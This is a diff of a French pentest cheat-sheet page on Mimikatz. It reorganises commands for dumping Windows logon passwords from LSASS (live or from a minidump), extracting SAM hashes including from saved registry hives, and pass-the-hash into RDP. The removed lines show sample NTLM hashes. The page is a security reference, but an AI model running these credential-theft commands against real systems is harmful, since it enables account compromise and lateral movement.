@@ -9,23 +9,36 @@ permalink: /Mimikatz/
 
 Repris de https://github.com/gentilkiwi/mimikatz/wiki
 
-#### Dump offline
+### Récupération mots de passe
 
-``` text
-mimikatz # sekurlsa::minidump lsass.dmp
-Switch to MINIDUMP : 'lsass.dmp'
+#### online
 
-mimikatz # sekurlsa::logonpasswords
-Opening : 'lsass.dmp' file for minidump...
-```
-
-#### Pass the hash et RDP
 ``` text
 privilege::debug
-sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
+sekurlsa::logonpasswords
 ```
 
-#### Dump offline de SAM
+#### offline
+
+A partir d'un dump lsass.dmp
+
+``` text
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
+### Récupération de hashs
+
+#### online
+
+``` text
+privilege::debug
+token::elevate
+lsadump::sam
+```
+
+#### offline
+
 Récupérer SAM et system:
 ```text
 reg save HKLM\SYSTEM SystemBkup.hiv
@@ -33,26 +46,13 @@ reg save HKLM\SAM SamBkup.hiv
 ```
 Dumper les hashs avec mimikatz:
 ```text
-mimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
-Domain : VM-W7-ULT-X
-SysKey : 74c159e4408119a0ba39a7872e9d9a56
+lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+```
 
-SAMKey : e44dd440fd77ebfe800edf60c11d4abd
-
-RID  : 000001f4 (500)
-User : Administrateur
-LM   :
-NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
-
-RID  : 000001f5 (501)
-User : Invité
-LM   :
-NTLM :
-
-RID  : 000003e8 (1000)
-User : Gentil Kiwi
-LM   :
-NTLM : cc36cf7a8514893efccd332446158b1a
+### Pass the hash et RDP
+``` text
+privilege::debug
+sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
 ```
 
 ## Secrets d'authentification en mémoire
